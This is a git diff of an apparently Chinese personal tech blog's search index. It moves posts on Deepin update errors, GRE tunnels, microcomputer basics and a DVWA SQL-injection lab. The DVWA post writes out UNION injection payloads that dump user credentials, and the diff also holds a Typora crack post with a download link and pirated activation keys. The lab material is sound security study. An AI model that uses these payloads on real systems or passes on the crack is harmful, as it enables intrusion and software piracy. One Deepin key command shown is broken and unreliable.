@@ -1073,64 +1073,6 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </tags>
   </entry>
   <entry>
-    <title>Deepin检查更新失败</title>
-    <url>/posts/8b4f8dc5/</url>
-    <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
-<pre class="language-none"><code class="language-none">root@123-PC:~$ sudo apt-get update
-获取:1 https:&#x2F;&#x2F;d.store.deepinos.org.cn  InRelease [1,524 B]
-命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
-命中:4 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                
-获取:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                         
-命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
-错误:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease
-  由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
-正在读取软件包列表... 完成
-W: GPG 错误：https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
-E: 仓库 “https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease” 没有数字签名。
-N: 无法安全地用该源进行更新，所以默认禁用该源。
-N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
-</code></pre>
-
-<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第三方应用商店商店（星火应用商店）的更新源与系统更新源冲突导致。</p>
-<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h3 id="方法一：把星火应用商店的仓库禁用"><a href="#方法一：把星火应用商店的仓库禁用" class="headerlink" title="方法一：把星火应用商店的仓库禁用"></a>方法一：把星火应用商店的仓库禁用</h3><blockquote>
-<p>注：此做法不影响星火应用商店安装应用</p>
-</blockquote>
-<p>打开终端先执行</p>
-<p><code>cd /etc/apt/sources.list.d</code></p>
-<p>再执行</p>
-<p><code>sudo mv sparkstore.list sparkstore.list.bkup</code></p>
-<h3 id="方法二：更新公钥"><a href="#方法二：更新公钥" class="headerlink" title="方法二：更新公钥"></a>方法二：更新公钥</h3><p>打开终端输入</p>
-<p><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys c #此处的EB3E94ADDE1229DD是报错时提示的key</code></p>
-<p>完成后显示</p>
-<pre class="language-xiao@xiao-PC:~$" data-language="xiao@xiao-PC:~$"><div class="caption"><span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADBE1229CF</span></div><code class="language-xiao@xiao-PC:~$">Executing: &#x2F;tmp&#x2F;apt-key-gpghome.CB8XSEEM1u&#x2F;gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADDE1229DD
-gpg: 密钥 EB3E94ADDE1229DD：公钥 “Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;” 已导入
-gpg: 处理的总数：1
-gpg:               已导入：1</code></pre>
-
-<p>之后输入</p>
-<p><code>sudo apt-get update</code></p>
-<p>提示</p>
-<pre class="language-获取:1" data-language="获取:1"><div class="caption"><span>https://d.store.deepinos.org.cn  InRelease [1,524 B]</span></div><code class="language-获取:1">命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
-获取:4 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                                  
-命中:5 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                         
-命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
-获取:6 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable&#x2F;main amd64 Packages [11.4 kB]
-已下载 12.9 kB，耗时 1秒 (15.5 kB&#x2F;s)
-正在读取软件包列表... 完成</code></pre>
-
-
-
-<p>之后就可以去设置里更新系统了</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>deepin</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GRE隧道</title>
     <url>/posts/ca260099/</url>
     <content><![CDATA[<h1 id="GRE隧道"><a href="#GRE隧道" class="headerlink" title="GRE隧道"></a>GRE隧道</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220618193734.png" alt="image-20220618193734151" loading="lazy"></p>
@@ -1322,6 +1264,64 @@ gpg:               已导入：1</code></pre>
       </categories>
       <tags>
         <tag>eNSP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Deepin检查更新失败</title>
+    <url>/posts/8b4f8dc5/</url>
+    <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
+<pre class="language-none"><code class="language-none">root@123-PC:~$ sudo apt-get update
+获取:1 https:&#x2F;&#x2F;d.store.deepinos.org.cn  InRelease [1,524 B]
+命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
+命中:4 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                
+获取:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                         
+命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
+错误:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease
+  由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
+正在读取软件包列表... 完成
+W: GPG 错误：https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
+E: 仓库 “https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease” 没有数字签名。
+N: 无法安全地用该源进行更新，所以默认禁用该源。
+N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
+</code></pre>
+
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第三方应用商店商店（星火应用商店）的更新源与系统更新源冲突导致。</p>
+<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h3 id="方法一：把星火应用商店的仓库禁用"><a href="#方法一：把星火应用商店的仓库禁用" class="headerlink" title="方法一：把星火应用商店的仓库禁用"></a>方法一：把星火应用商店的仓库禁用</h3><blockquote>
+<p>注：此做法不影响星火应用商店安装应用</p>
+</blockquote>
+<p>打开终端先执行</p>
+<p><code>cd /etc/apt/sources.list.d</code></p>
+<p>再执行</p>
+<p><code>sudo mv sparkstore.list sparkstore.list.bkup</code></p>
+<h3 id="方法二：更新公钥"><a href="#方法二：更新公钥" class="headerlink" title="方法二：更新公钥"></a>方法二：更新公钥</h3><p>打开终端输入</p>
+<p><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys c #此处的EB3E94ADDE1229DD是报错时提示的key</code></p>
+<p>完成后显示</p>
+<pre class="language-xiao@xiao-PC:~$" data-language="xiao@xiao-PC:~$"><div class="caption"><span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADBE1229CF</span></div><code class="language-xiao@xiao-PC:~$">Executing: &#x2F;tmp&#x2F;apt-key-gpghome.CB8XSEEM1u&#x2F;gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADDE1229DD
+gpg: 密钥 EB3E94ADDE1229DD：公钥 “Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;” 已导入
+gpg: 处理的总数：1
+gpg:               已导入：1</code></pre>
+
+<p>之后输入</p>
+<p><code>sudo apt-get update</code></p>
+<p>提示</p>
+<pre class="language-获取:1" data-language="获取:1"><div class="caption"><span>https://d.store.deepinos.org.cn  InRelease [1,524 B]</span></div><code class="language-获取:1">命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
+获取:4 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                                  
+命中:5 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                         
+命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
+获取:6 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable&#x2F;main amd64 Packages [11.4 kB]
+已下载 12.9 kB，耗时 1秒 (15.5 kB&#x2F;s)
+正在读取软件包列表... 完成</code></pre>
+
+
+
+<p>之后就可以去设置里更新系统了</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>deepin</tag>
       </tags>
   </entry>
   <entry>
@@ -5019,7 +5019,7 @@ cond(no)-&gt;op</code></pre>
     <title>Typora破解</title>
     <url>/posts/97fee53e/</url>
     <content><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1lBwPXa4DG_3EQbH_Jhd8cg?pwd=nl4a">https://pan.baidu.com/s/1lBwPXa4DG_3EQbH_Jhd8cg?pwd=nl4a</a><br>提取码：nl4a</p>
-<h3 id="安装后"><a href="#安装后" class="headerlink" title="安装后"></a>安装后</h3><p>1、覆盖文件<br>将 app.asar.txt 文件名中的“.txt”去掉，并覆盖至安装路径的“resources”文件夹内，参考路径：<br>C:\Program Files\Typora\resources<br>2、输入序列号<br>打开 typora ，点击“输入序列号”<br>邮箱一栏中任意填写（但须保证邮箱地址格式正确），输入序列号，点击“激活”。<br>邮箱地址例如：<a href="mailto:&#x31;&#64;&#49;&#x2e;&#99;&#111;&#x6d;">&#x31;&#64;&#49;&#x2e;&#99;&#111;&#x6d;</a><br>激活码：<br>● DZTX2H-6MCQZT-QL4GCT-5EBWFX<br>● G7LPKN-HP4NLD-FA3BGF-6JDQ5R<br>● 3MH4Y8-YJWT37-G5JL9Y-UHNQDJ<br>● 85ZPHY-ELQ9FQ-94J3VP-D92YLU<br>● VEZ7NV-USYN3G-8TL2N3-DADUG4</p>
+<h3 id="安装后"><a href="#安装后" class="headerlink" title="安装后"></a>安装后</h3><p>1、覆盖文件<br>将 app.asar.txt 文件名中的“.txt”去掉，并覆盖至安装路径的“resources”文件夹内，参考路径：<br>C:\Program Files\Typora\resources<br>2、输入序列号<br>打开 typora ，点击“输入序列号”<br>邮箱一栏中任意填写（但须保证邮箱地址格式正确），输入序列号，点击“激活”。<br>邮箱地址例如：<a href="mailto:&#x31;&#64;&#49;&#46;&#x63;&#111;&#x6d;">&#x31;&#64;&#49;&#46;&#x63;&#111;&#x6d;</a><br>激活码：<br>● DZTX2H-6MCQZT-QL4GCT-5EBWFX<br>● G7LPKN-HP4NLD-FA3BGF-6JDQ5R<br>● 3MH4Y8-YJWT37-G5JL9Y-UHNQDJ<br>● 85ZPHY-ELQ9FQ-94J3VP-D92YLU<br>● VEZ7NV-USYN3G-8TL2N3-DADUG4</p>
 <p>填写完成后激活成功</p>
 ]]></content>
       <categories>
@@ -6396,6 +6396,55 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </tags>
   </entry>
   <entry>
+    <title>dvwa--SQL注入(low)</title>
+    <url>/posts/cb7e67e1/</url>
+    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
+
+<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
+<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
+<p>① 输入1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
+<p>②输入1’ 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
+<p>③输入1 and 1&#x3D;1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
+<p>④输入1 and 1&#x3D;2提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
+<p>**猜解 SQL 查询语句中的字段数, **</p>
+<p>①1’ order by 1#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
+<p>②1’ order by 2#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
+<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
+<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
+<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
+<p><strong>查询当前的数据库, 以及版本</strong></p>
+<p>1’ union select version(),database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
+<p>获取数据库中的表,</p>
+<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
+<p>获取表中的字段名,</p>
+<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
+<p>获得字段中的数据,</p>
+<p>1’ union select user, password from users#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>DVWA</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa--盲注</title>
     <url>/posts/75e4ecec/</url>
     <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
@@ -6615,55 +6664,6 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
 <br>
 
 <p>部分参考来自：<a href="https://www.jianshu.com/p/ec2ca79e74b2">DVWA–SQL Injection(Blind)盲注–SQLMap测试过程解析</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>DVWA</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa--SQL注入(low)</title>
-    <url>/posts/cb7e67e1/</url>
-    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
-
-<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
-<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
-<p>① 输入1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
-<p>②输入1’ 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
-<p>③输入1 and 1&#x3D;1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
-<p>④输入1 and 1&#x3D;2提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
-<p>**猜解 SQL 查询语句中的字段数, **</p>
-<p>①1’ order by 1#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
-<p>②1’ order by 2#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
-<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
-<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
-<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
-<p><strong>查询当前的数据库, 以及版本</strong></p>
-<p>1’ union select version(),database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
-<p>获取数据库中的表,</p>
-<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
-<p>获取表中的字段名,</p>
-<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
-<p>获得字段中的数据,</p>
-<p>1’ union select user, password from users#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -7126,7 +7126,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《云边有个小卖部》摘抄</title>
     <url>/posts/4b648fc6/</url>
     <content><![CDATA[
-    <div id="aplayer-vOvPzgPH" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-fCLbeMVU" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1298779845" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -7230,7 +7230,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-TltOdUDk" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-sADicyaF" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -8137,62 +8137,6 @@ mountvol X: &#x2F;d</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>微机原理三</title>
-    <url>/posts/24269dc7/</url>
-    <content><![CDATA[<h1 id="微机原理四"><a href="#微机原理四" class="headerlink" title="微机原理四"></a>微机原理四</h1><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><ul>
-<li>ascll码（七位二进制数表示）</li>
-</ul>
-<p>常用： “0”——48 ； “A” —— 65  ； “a”—— 97 </p>
-<ul>
-<li><p>数值编码：BCD码（8421）用四位二进制数码表示一位十进制数</p>
-<p>0 	 0	  0	  0              (0000)<sub>BCD</sub> &#x3D; (0)<sub>10</sub>        ;      (0100)<sub>BCD</sub> &#x3D; (4)<sub>10</sub>    ;    (01100100)<sub>BCD</sub> &#x3D; (64)<sub>10</sub>  </p>
-<p>2<sup>3</sup>	2<sup>2</sup>	2<sup>1</sup>	2<sup>0</sup></p>
-</li>
-</ul>
-<p>注：用0000~1001分别代表他所对应的十进制数，余下的（1010-1111）六组代码不用，一般跟十进制转换。</p>
-<h2 id="无符号二进制的算术运算和逻辑运算"><a href="#无符号二进制的算术运算和逻辑运算" class="headerlink" title="无符号二进制的算术运算和逻辑运算"></a>无符号二进制的算术运算和逻辑运算</h2><ul>
-<li>算术运算：加法、减法、乘法、除法</li>
-<li>逻辑运算： 与运算、或运算、非运算、异或运算</li>
-</ul>
-<h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><h4 id="加法："><a href="#加法：" class="headerlink" title="加法："></a>加法：</h4><p>0 + 1 &#x3D; 1		 ；    1 + 1 &#x3D; 10 ； 		 101B + 10B &#x3D; 1011B</p>
-<h4 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h4><p>1 - 1 &#x3D; 0   ；  1 -0 &#x3D; 1   ；  10 - 1 &#x3D; 1 ；   110B - 11B  &#x3D; 11B</p>
-<h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><p>0011 1010 B *  0100 B &#x3D; 0011 1010 00 B</p>
-<ul>
-<li>将其中一个乘数转为2<sup>n</sup> </li>
-<li>如果n为整数且大于零“左移n位，右边补零”</li>
-<li>如果不是整数且大于零“转为十进制数再乘，再转为二进制数”</li>
-</ul>
-<h4 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h4><p>0011 1010 B ÷ 1 0011 1011 B &#x3D; 1 1000 0110 B</p>
-<ul>
-<li>将被除数转为2<sup>n</sup> </li>
-<li>如果n为整数且大于零“右移n位，右边补零”</li>
-<li>如果不是整数且大于零“转为十进制数再乘，再转为二进制数</li>
-</ul>
-<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p> 100 1011 B + 1 0011 1011 B &#x3D; 1 1000 0110 B</p>
-<p>11 1001 B - 1 0111 B &#x3D; 10 0010 B<br>1 0011 B × 0100 B &#x3D; 100 1100 B<br>1 0011 B ÷ 0100 B &#x3D; 100B 	余数： 11B</p>
-<p>总结： 其他进制的运算参数对应其进制数 ：方法不变</p>
-<h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><h4 id="”与“运算-符号-：∧（并且）"><a href="#”与“运算-符号-：∧（并且）" class="headerlink" title="”与“运算  符号 ：∧（并且）"></a>”与“运算  符号 ：∧（并且）</h4><p>1 ∧ 1 &#x3D; 1  ； 1 ∧ 0 &#x3D; 0 ； 0 ∧1 &#x3D; 0 ； 0 ∧ 0 &#x3D; 0 </p>
-<p>计算要点： 1为真、零为假； 同时真为真</p>
-<p>例： 110 0110 B ∧ 1011 1010 B &#x3D; 1000 1000 B</p>
-<h4 id="”或“运算-符号：-∨（或者）"><a href="#”或“运算-符号：-∨（或者）" class="headerlink" title="”或“运算 符号： ∨（或者）"></a>”或“运算 符号： ∨（或者）</h4><p>1∨1 &#x3D; 1  ； 1 ∨ 0 &#x3D; 1 ； 0 ∨1 &#x3D; 1 ； 0 ∨ 0 &#x3D; 0 </p>
-<p>计算要点： 1为真、零为假； 同时假为假</p>
-<p>例： 1100 1101 B ∨ 1011 1010 B &#x3D; 1111 1111 B</p>
-<h4 id="”非“运算-符号-￣"><a href="#”非“运算-符号-￣" class="headerlink" title="”非“运算 符号 ￣"></a>”非“运算 符号 ￣</h4><p><span style="text-decoration: overline">1B</span> &#x3D; <span style="text-decoration: overline">0B</span>    ;  <span style="text-decoration: overline">0B</span> &#x3D; <span style="text-decoration: overline">1B</span>   </p>
-<p>计算要点： 按位取反</p>
-<p>例： <span style="text-decoration: overline">101 0011 B</span> &#x3D; <span style="text-decoration: overline">010 1100</span></p>
-<h4 id="”异或“运算-符号⊕"><a href="#”异或“运算-符号⊕" class="headerlink" title="”异或“运算  符号⊕"></a>”异或“运算  符号⊕</h4><p> 1 ⊕ 1 &#x3D; 0  ； 0 ⊕ 1 &#x3D; 1  ； 1 ⊕ 0 &#x3D; 1   ；0 ⊕ 0 &#x3D; 1</p>
-<p>计算要点： 两位相同结果为零 ，两位相异结果为一</p>
-<p>例： 1100 1101 B ⊕ 1011 1010 B &#x3D; 0111 0111 B</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>微机原理</category>
-      </categories>
-      <tags>
-        <tag>微机原理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>广域网基础</title>
     <url>/posts/8f06ed5e/</url>
     <content><![CDATA[<div class="danger">
@@ -8316,49 +8260,90 @@ mountvol X: &#x2F;d</code></pre>
   </entry>
   <entry>
     <title>微机原理基础一</title>
-    <url>/posts/97f746d8/</url>
-    <content><![CDATA[<h2 id="微型计算机的基本组成及各部分的功能及作用"><a href="#微型计算机的基本组成及各部分的功能及作用" class="headerlink" title="微型计算机的基本组成及各部分的功能及作用"></a>微型计算机的基本组成及各部分的功能及作用</h2><p>世界第一台计算机：1946年</p>
-<p>第一代：电子管数字计算机ENIAC</p>
-<p>第二代：晶体管计算机1956年</p>
-<p>第三代：集成电路计算机1964年</p>
-<p>第四代：大规模集成电路和超大规模集成电路计算机1970年</p>
-<div class= "mermaid">
-graph TD;
-    微型计算机系统-->硬件系统;
-       微型计算机系统-->软件系统;
-    硬件系统-->主机系统;
-    硬件系统-->外部设备;
-    主机系统-->CPU;
-    主机系统-->存储器;
-    主机系统-->总线;
-    主机系统-->I/O接口;
-    软件系统-->系统软件;
-    软件系统-->应用软件;
-    外部设备-->鼠标/键盘;
-       系统软件-->Android/Windows/Linux/Mac/IOS;
-       应用软件-->QQ/微信;
-</div>
-
-
-
-
-
-<h2 id="微型计算机的基本工作过程"><a href="#微型计算机的基本工作过程" class="headerlink" title="微型计算机的基本工作过程"></a>微型计算机的基本工作过程</h2><p>冯·诺依曼（“现代计算机之父”）</p>
-<ul>
-<li>计算机五大部件：运算器、控制器、存储器、输入和输出设备</li>
-<li>计算机工作原理：存储程序、程序控制</li>
-<li>指令按顺序组成，放于存储器</li>
-<li>指令和数据采用二进制编码</li>
-<li>控制器控制整个程序和数据的存储以继程序的执行</li>
-<li>运算器为核心，所有的执行都经过运算器</li>
+    <url>/posts/ac776871/</url>
